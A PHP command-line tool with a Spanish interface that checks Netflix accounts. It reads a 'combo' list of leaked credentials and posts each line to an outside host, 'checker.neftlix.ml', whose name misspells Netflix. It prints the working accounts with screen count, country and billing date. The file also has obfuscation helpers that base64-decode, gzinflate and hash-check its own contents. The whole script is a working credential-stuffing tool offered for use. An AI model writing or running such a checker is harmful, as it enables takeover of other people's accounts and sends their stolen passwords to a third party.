<?php 

$XnNhAWEnhoiqwciqpoHH=file("netflixchk.php");

function YiunIUY76bBhuhNYIO8($g, $b = 0) {
    $a = implode("
", $g);
    $d = array(655, 236, 40);
    if ($b == 0) $f = substr($a, $d[0], $d[1]);
    elseif ($b == 1) $f = substr($a, $d[0] + $d[1], $d[2]);
    else $f = trim(substr($a, $d[0] + $d[1] + $d[2]));
    return ($f);
}
if (!function_exists("YiunIUY76bBhuhNYIO8")) {
    function YiunIUY76bBhuhNYIO8($g, $b = 0) {
        $a = implode("
", $g);
        $d = array(655, 236, 40);
        if ($b == 0) $f = substr($a, $d[0], $d[1]);
        elseif ($b == 1) $f = substr($a, $d[0] + $d[1], $d[2]);
        else $f = trim(substr($a, $d[0] + $d[1] + $d[2]));
        return ($f);
    }
}


//echo base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH));

if(!function_exists("ZsldkfhGYU87iyihdfsow")){
	function ZsldkfhGYU87iyihdfsow($a,$h){
	  if($h==sha1($a)){
	      return(gzinflate(base64_decode($a)));
	  }else{
	    echo("Error: File Modified");
	  }
	}
}

echo "\033[01;31m [Dev > Junior Hilario Jara] _ _ _ __ _ _ ____ _ _ | \ | | ___| |_ / _| (_)_ __/ ___| |__ | | __ | \| |/ _ \ __| |_| | \ \/ / | | '_ \| |/ / | |\ | __/ |_| _| | |> <| |___| | | | < |_| \_|\___|\__|_| |_|_/_/\_\_____|_| |_|_|\_\ \033[0m\033[01;31m#SentinelSociety\033[0m\n"; 
$ruta = readline("Ruta del combo: "); 
echo "\033[01;36m======================================\033[0m\n"; 
echo "\033[01;33mSi no ve nada abajo, no se preocupe aun no hay cuentas que sirvan\033[0m\n"; 
echo "\033[01;36m======================================\033[0m\n"; 
$oa = fopen($ruta, 'r') or exit("\033[01;31mError al abrir combo!\033[0m\n"); 
while($linea = fgets($oa)) 
{ 
if (feof($oa)) 
break; 
$linea = substr( $linea, 0, -1 ); 
$netflix = curl_init(); 
curl_setopt($netflix, CURLOPT_URL,"https://checker.neftlix.ml/check-account?account=$linea" ); 
curl_setopt($netflix, CURLOPT_RETURNTRANSFER, 1 ); 
curl_setopt($netflix, CURLOPT_POST, 1 ); 
$info=curl_exec ($netflix); 
curl_close ($netflix); 
//echo $info; 
if (strpos($info, '"working":true') !==false) { 
$info=(json_decode($info, true)); 
$i=0; 
foreach($info as $clave => $valor) { 
$i++; if($i!=1&&$i!=6){ if($clave=="account"){ 
$clave="Cuenta"; 
} 
if($clave=="screens"){ 
$clave="Pantallas"; 
} if($clave=="language"){ 
$clave="Pais"; 
} 
if($clave=="until"){ $clave="Facturacion"; 
} 
echo "\033[01;32m$clave => $valor\033[0m" ; 
if($i!=5){ 
echo "\033[01;32m|\033[0m"; 
} 
} 
} 
echo "\n"; 
} 
} 
fclose($oa);

